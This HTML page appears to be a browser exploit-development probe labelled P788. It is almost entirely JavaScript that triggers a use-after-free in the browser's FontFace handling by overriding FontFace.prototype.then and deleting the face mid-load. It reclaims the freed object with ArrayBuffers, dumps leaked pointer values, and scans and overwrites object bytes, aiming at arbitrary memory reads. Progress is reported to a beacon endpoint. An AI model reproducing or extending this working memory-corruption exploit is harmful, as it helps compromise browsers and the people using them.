<!DOCTYPE html>
<html><head><meta charset="utf-8">
<meta http-equiv="Cache-Control" content="no-cache,no-store,must-revalidate">
<title>P788 — CSSFontFace Status Byte Scanner</title>
<style>
  body { background: #0c0d14; color: #d0d7de; font-family: monospace; font-size: 14px; padding: 20px; line-height: 1.5; }
  pre { background: #161b22; border: 1px solid #30363d; padding: 12px; border-radius: 6px; overflow-x: auto; color: #7ee787; font-size: 13px; }
</style>
<script>
'use strict';
/* ============================================================
 * P788 — CSSFontFace Status Byte Scanner
 *
 * Proven: local() UAF + AB(192) reclaim works (P786 Phase 1).
 * Proven: re-add works (P786 Phase 3: addErr=none, has=true).
 * Problem: fonts.check returns true for everything after re-add
 *          because face status is "loaded".
 *
 * This probe: after UAF+reclaim+re-add, systematically set each
 * byte in the 192B AB to different values and check if
 * fonts.check('1em f0', 'A') flips from true to false.
 *
 * If a hit is found: that byte controls the loading status.
 * If no hits: fonts.check doesn't read from the AB after re-add
 * (meaning re-add created a new CSSFontFace, not reusing ours).
 *
 * CRASH_CLASS: LOW — only modifies bytes in our own ArrayBuffer
 * ============================================================ */

window.onerror = function(msg, url, line){
  try { var x = new XMLHttpRequest();
    x.open('GET', '/beacon.php?tag=P788-ERR&data=' + encodeURIComponent((msg||'') + ' L' + line) + '&t=' + Date.now(), false);
    x.send(null); } catch(e){}
};

function h16(v){ return ('0000000000000000' + BigInt(v || 0).toString(16)).slice(-16); }

function b(tag, data){
  try { var x = new XMLHttpRequest();
    x.open('GET', '/beacon.php?tag=P788-' + encodeURIComponent(tag) +
      '&data=' + encodeURIComponent(String(data || '').slice(0, 700)) + '&t=' + Date.now(), false);
    x.send(null); } catch(e){}
}

var OUT = null;
function log(s){
  if (!OUT) OUT = document.getElementById('out');
  if (OUT) OUT.textContent += s + '\n';
}

function run(){
  OUT = document.getElementById('out');
  log('=== P788: CSSFontFace Status Byte Scanner ===\n');
  b('BOOT', 'start');
  doUAF();
}

var BUF = null, VIEW = null, FACE = null;

function doUAF(){
  b('UAF-GO', '');

  var st = document.createElement('style');
  st.textContent = '@font-face{font-family:bb;src:local(Arial);unicode-range:U+0042;}';
  document.head.appendChild(st);

  FACE = new FontFace('f0', 'local(Helvetica)', { unicodeRange: 'U+0041' });
  document.fonts.add(FACE);
  void FACE.loaded;

  var abs = [], fired = false;
  Object.defineProperty(FontFace.prototype, 'then', {
    configurable: true,
    get: function(){
      if (fired) return undefined;
      fired = true;
      if (st){ st.remove(); st.textContent = ''; st = null; }
      try { document.fonts.delete(this); } catch(e){}
      document.body.offsetHeight;
      for (var k = 0; k < 64; k++) abs.push(new ArrayBuffer(192));
      try { document.fonts.check('1em bb'); } catch(e){}
      document.body.offsetHeight;
      return undefined;
    },
    set: function(){}
  });

  document.fonts.load('1em f0, bb', 'AB');

  setTimeout(function(){
    delete FontFace.prototype.then;

    var best = -1, bestNz = 0;
    for (var i = 0; i < abs.length; i++){
      var u = new Uint8Array(abs[i]), nz = 0;
      for (var j = 0; j < u.length; j++) if (u[j] !== 0) nz++;
      if (nz > bestNz){ bestNz = nz; best = i; }
    }

    if (best < 0 || bestNz < 4){
      b('UAF-MISS', 'nz=' + bestNz);
      log('Reclaim missed (nz=' + bestNz + ')');
      return;
    }

    BUF = abs[best];
    VIEW = new BigUint64Array(BUF);
    var q0 = VIEW[0], q11 = VIEW[11], q12 = VIEW[12], q13 = VIEW[13];

    b('UAF-HIT', 'k=' + best + '|nz=' + bestNz +
      '|q0=0x' + h16(q0) + '|q11=0x' + h16(q11) +
      '|q12=0x' + h16(q12) + '|q13=0x' + h16(q13));
    log('UAF HIT: k=' + best + ' nz=' + bestNz);
    log('  q0=0x' + h16(q0) + '  q11=0x' + h16(q11));
    log('  q12=0x' + h16(q12) + '  q13=0x' + h16(q13));

    /* Dump all 24 qwords for reference */
    var nzSlots = [];
    for (var q = 0; q < 24; q++){
      if (VIEW[q] !== 0n) nzSlots.push('q' + q + '=0x' + h16(VIEW[q]));
    }
    b('DUMP', nzSlots.join('|'));

    setTimeout(doReAddAndScan, 50);
  }, 300);
}

function doReAddAndScan(){
  log('\n=== Phase 2: Re-Add & Baseline ===');

  /* Re-add face */
  var addErr = 'none';
  try { document.fonts.add(FACE); } catch(e){ addErr = e.message; }
  var has = document.fonts.has(FACE);
  var status = FACE.status;
  b('READD', 'err=' + addErr + '|has=' + has + '|status=' + status);
  log('Re-add: err=' + addErr + ' has=' + has + ' status=' + status);

  /* Baseline: fonts.check with UNMODIFIED AB */
  var baseA = document.fonts.check('1em f0', 'A');
  var baseB = document.fonts.check('1em f0', 'B');
  var baseC = document.fonts.check('1em f0', 'C');
  b('BASE', 'chkA=' + baseA + '|chkB=' + baseB + '|chkC=' + baseC);
  log('Baseline: chkA=' + baseA + ' chkB=' + baseB + ' chkC=' + baseC);

  if (baseA !== true){
    b('BASE-UNEXPECTED', 'chkA-already-false');
    log('UNEXPECTED: baseline chkA is already false!');
  }

  log('\n=== Phase 3: Nuclear Test (all safe bytes to 0xFF) ===');
  doNuclearTest(baseA, function(){
    log('\n=== Phase 4: Byte-by-byte scan ===');
    doByteScan(baseA);
  });
}

function doNuclearTest(baseA, cb){
  var u8 = new Uint8Array(BUF);
  var saved = new Uint8Array(192);
  saved.set(u8);

  /* Set every byte EXCEPT q11 (88-95) and q13 (104-111) to 0xFF */
  for (var i = 0; i < 192; i++){
    if (i >= 88 && i <= 95) continue;
    if (i >= 104 && i <= 111) continue;
    u8[i] = 0xFF;
  }

  var nucA, nucB, nucErr = 'none';
  try {
    nucA = document.fonts.check('1em f0', 'A');
    nucB = document.fonts.check('1em f0', 'B');
  } catch(e){ nucErr = e.message; }

  /* Restore immediately */
  u8.set(saved);

  var flipped = (nucA !== baseA);
  b('NUCLEAR', 'chkA=' + nucA + '|chkB=' + nucB + '|flipped=' + flipped + '|err=' + nucErr);
  log('Nuclear: chkA=' + nucA + ' chkB=' + nucB + ' flipped=' + flipped);

  if (!flipped){
    log('*** fonts.check may NOT read from our AB after re-add ***');
  } else {
    log('*** NUCLEAR HIT: fonts.check DOES read from our AB! ***');
  }

  setTimeout(cb, 20);
}

function doByteScan(baseA){
  var u8 = new Uint8Array(BUF);
  var hits = [];
  var tested = 0;

  /* Scan each byte with values 0-4 */
  for (var off = 0; off < 192; off++){
    /* Skip pointer regions to avoid crash */
    if (off >= 88 && off <= 95) continue;   /* q11 */
    if (off >= 104 && off <= 111) continue;  /* q13 */

    var orig = u8[off];

    /* Test values 0, 1, 2, 3, 4, 0xFF */
    var testVals = [0, 1, 2, 3, 4, 0xFF];
    for (var vi = 0; vi < testVals.length; vi++){
      var val = testVals[vi];
      if (val === orig) continue; /* skip no-op */

      u8[off] = val;
      tested++;
      try {
        var chk = document.fonts.check('1em f0', 'A');
        if (chk !== baseA){
          hits.push(off + ':v' + val + ':o' + orig);
        }
      } catch(e){
        hits.push(off + ':v' + val + ':ERR');
      }
      u8[off] = orig;
    }
  }

  b('SCAN-DONE', 'tested=' + tested + '|hits=' + hits.length + '|' + hits.join(','));
  log('Scan complete: tested=' + tested + ' hits=' + hits.length);

  if (hits.length > 0){
    log('*** HITS FOUND: ' + hits.join(', ') + ' ***');
    b('HITS', hits.join(','));

    /* Verify first hit */
    var parts = hits[0].split(':');
    var hitOff = parseInt(parts[0]);
    var hitVal = parseInt(parts[1].substring(1));
    log('\nVerifying hit at offset ' + hitOff + ' with value ' + hitVal + '...');
    verifyHit(hitOff, hitVal);
  } else {
    log('No hits. fonts.check does NOT read status from our AB.');
    log('Re-add likely creates a new CSSFontFace.');

    /* Phase 5: Test q12 manipulation (Vector size/capacity) */
    log('\n=== Phase 5: q12 Vector metadata test ===');
    doQ12Test(baseA);
  }
}

function verifyHit(off, val){
  var u8 = new Uint8Array(BUF);
  var orig = u8[off];

  /* Set the hit byte */
  u8[off] = val;

  /* Test multiple characters */
  var chkA = document.fonts.check('1em f0', 'A'); /* in-range U+0041 */
  var chkB = document.fonts.check('1em f0', 'B'); /* out-range */
  var chkC = document.fonts.check('1em f0', 'C'); /* out-range */
  var chkSp = document.fonts.check('1em f0', ' '); /* out-range */

  b('VERIFY', 'off=' + off + '|val=' + val + '|chkA=' + chkA + '|chkB=' + chkB +
    '|chkC=' + chkC + '|chkSp=' + chkSp);
  log('Verify off=' + off + ' val=' + val + ':');
  log('  chkA(in-range)=' + chkA + '  chkB(out)=' + chkB +
    '  chkC(out)=' + chkC + '  chkSp(out)=' + chkSp);

  /* Oracle discrimination test:
     If status=loading AND ranges work:
       in-range → false, out-range → true (ORACLE WORKS!)
     If status=loading AND ranges empty (covers all):
       ALL → false (LOADING but no discrimination)
  */
  var isOracle = (chkA === false && chkB === true);
  var isAllLoading = (chkA === false && chkB === false);
  b('VERIFY-VERDICT', 'oracle=' + isOracle + '|allLoading=' + isAllLoading);
  log('Oracle discriminates: ' + isOracle);
  log('All-loading (no range filter): ' + isAllLoading);

  if (isOracle || isAllLoading){
    log('\n*** STATUS BYTE FOUND AT OFFSET ' + off + ' ***');
    log('*** Value ' + val + ' = loading state ***');

    /* Now test if we can redirect q11 to read arbitrary memory */
    log('\n=== Phase 6: q11 redirect with status=loading ===');
    doQ11Redirect(off, val);
  }

  u8[off] = orig;
  b('DONE', 'complete');
  log('\n=== P788 COMPLETE ===');
}

function doQ11Redirect(statusOff, statusVal){
  var u8 = new Uint8Array(BUF);

  /* Keep status as loading */
  u8[statusOff] = statusVal;

  /* Set q12 to size=1, capacity=1 (so engine reads 1 range entry from q11) */
  VIEW[12] = 0x0000000100000001n;

  /* Test: does fonts.check now dereference q11 as a UnicodeRange buffer? */
  var chkOrig = document.fonts.check('1em f0', 'A');

  /* Point q11 to a buffer we control with a range covering U+0041 */
  var fakeBuf = new ArrayBuffer(32);
  var fakeView = new BigUint64Array(fakeBuf);
  /* UnicodeRange is {uint32_t from, uint32_t to} = 8 bytes */
  /* Range U+0041 to U+0041: from=0x41, to=0x41 */
  var fakeU32 = new Uint32Array(fakeBuf);
  fakeU32[0] = 0x41; /* from */
  fakeU32[1] = 0x41; /* to */

  /* We can't easily get the address of fakeBuf in JS...
     but we CAN test with original q11 (which points to the engine's range buffer) */

  /* Instead: test with q11=0 (null buffer) + size=0 → should cover everything */
  VIEW[11] = 0n;
  VIEW[12] = 0n; /* size=0, capacity=0 → empty → covers all */
  var chkNull = document.fonts.check('1em f0', 'A');
  var chkNullB = document.fonts.check('1em f0', 'B');

  b('Q11-REDIR', 'chkOrig=' + chkOrig + '|chkNull=' + chkNull + '|chkNullB=' + chkNullB);
  log('q11 redirect: origA=' + chkOrig + ' nullA=' + chkNull + ' nullB=' + chkNullB);

  /* Restore everything */
  var saved11 = VIEW[11], saved12 = VIEW[12];
  /* (will be restored by caller) */
}

function doQ12Test(baseA){
  /* Try different q12 values to see if Vector metadata matters */
  var origQ12 = VIEW[12];

  var q12vals = [
    0x0000000100000001n,  /* size=1, cap=1 */
    0x0000002000000001n,  /* size=1, cap=32 */
    0x0000002000000000n,  /* size=0, cap=32 (P704 value) */
    0x0000000100000000n,  /* size=0, cap=1 */
    0xFFFFFFFFFFFFFFFFn,  /* all bits */
  ];
  var q12hits = [];

  for (var i = 0; i < q12vals.length; i++){
    VIEW[12] = q12vals[i];
    try {
      var chk = document.fonts.check('1em f0', 'A');
      if (chk !== baseA){
        q12hits.push('q12=0x' + h16(q12vals[i]) + ':chkA=' + chk);
      }
    } catch(e){
      q12hits.push('q12=0x' + h16(q12vals[i]) + ':ERR=' + e.message);
    }
    VIEW[12] = origQ12;
  }

  b('Q12-TEST', 'hits=' + q12hits.length + '|' + q12hits.join(','));
  log('q12 test: ' + q12hits.length + ' hits');
  if (q12hits.length > 0) log('  ' + q12hits.join('\n  '));

  /* Phase 6: Also try setting q0 refcount to 0 */
  log('\n=== Phase 6: q0 refcount test ===');
  var origQ0 = VIEW[0];
  VIEW[0] = 0n;
  var chkQ0zero = document.fonts.check('1em f0', 'A');
  VIEW[0] = origQ0;
  b('Q0-TEST', 'chkA=' + chkQ0zero);
  log('q0=0 (refcount zero): chkA=' + chkQ0zero);

  b('DONE', 'no-status-byte-found');
  log('\n=== P788 COMPLETE — No status byte in AB ===');
}

if (document.readyState === 'complete' || document.readyState === 'interactive') setTimeout(run, 0);
else document.addEventListener('DOMContentLoaded', run);
</script>
</head>
<body>
  <pre id="out">P788 — CSSFontFace Status Byte Scanner — Initializing...</pre>
</body>
</html>
